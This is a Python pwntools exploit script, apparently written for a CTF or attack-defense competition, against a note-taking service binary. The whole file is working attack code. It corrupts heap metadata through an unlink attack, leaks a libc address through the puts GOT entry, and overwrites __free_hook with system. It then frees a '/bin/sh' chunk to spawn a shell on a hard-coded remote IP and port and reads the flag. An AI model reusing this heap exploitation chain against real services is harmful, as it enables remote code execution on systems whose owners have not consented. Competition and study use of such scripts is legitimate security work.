#coding=utf-8
from pwn import *
local = 0
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
a=""
def debug():
    gdb.attach(a,'''
    b *(0x000000000400C8A)
    b *0x000000000400D86
    b *0x000000000401059
    b *0x000000000400F1F
    ''')
def menu(idx):
    a.sendlineafter("> ",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Input Your Note Size: ",str(size))
    a.sendafter("Note: \n",content)
def delete(idx):
    menu(4)
    a.sendlineafter("Input your note index: ",str(idx))
def show(idx):
    menu(2)
    a.sendlineafter("Input your note index: ",str(idx))
def edit(idx,size,conteng):
    menu(3)
    a.sendlineafter("Input your note index: ",str(idx))
    a.sendlineafter("Input your note new size: ",str(size))
    a.sendafter("Note: \n",conteng)

def exp(ip,port):#返回字符串类型的flag，用于awd 
    global a
    a=remote(ip,port)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    puts_got=elf.got["puts"]
    ptr=0x000000000602070
    add(0x78,'A\n')#0
    add(0xf8,'A\n')#1
    add(0x18,'/bin/sh\x00\n')#2
    payload=p64(0)+p64(0x71)
    payload+=p64(ptr-0x18)+p64(ptr-0x10)
    payload+=p64(0)*10+p64(0x70)
    edit(0,0x78,payload)
    #debug()
    delete(1)
    payload='A'*8+p64(0x78)+p64(1)
    payload+=p64(puts_got)+p64(0x88)+p64(1)+p64(0x000000000602070)+'\n'
    edit(0,0x78,payload)
    #debug()
    show(0)
    libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
    success("libc_base ==> 0x%x"%libc_base)
    __free_hook=libc.symbols["__free_hook"]+libc_base
    system_addr=libc.symbols["system"]+libc_base
    payload=p64(__free_hook)+'\n'
    edit(1,0x78,payload)
    #debug()
    edit(0,0x10,p64(system_addr)+'\n')
    delete(2)
    a.sendline("cat flag")
    a.interactive()
exp("47.244.12.21",21180)
    










